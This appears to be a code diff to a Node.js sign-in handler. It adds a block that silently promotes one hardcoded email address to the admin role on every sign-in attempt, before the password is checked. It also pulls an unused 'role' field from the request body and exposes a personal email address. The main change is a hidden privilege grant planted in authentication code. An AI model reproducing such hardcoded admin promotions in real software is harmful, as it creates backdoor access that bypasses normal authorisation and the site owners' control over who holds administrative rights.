@@ -29,7 +29,7 @@ const signUp = async (req, res) => {
 
 const SignIn = async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, role } = req.body;
 
     const user = await userModel.findOne({ email });
     if (!user) {
@@ -38,6 +38,12 @@ const SignIn = async (req, res) => {
 
     // Compare password
     const isValidPass = await bcrypt.compare(password, user.password);
+
+    // make a user an admin
+    if (user.email === "kobiowuq@gmail.com"){
+      user.role = "admin"
+      await user.save()
+    }
 
     if (!isValidPass) {
       return res.status(401).json({ message: 'Invalid Password' });
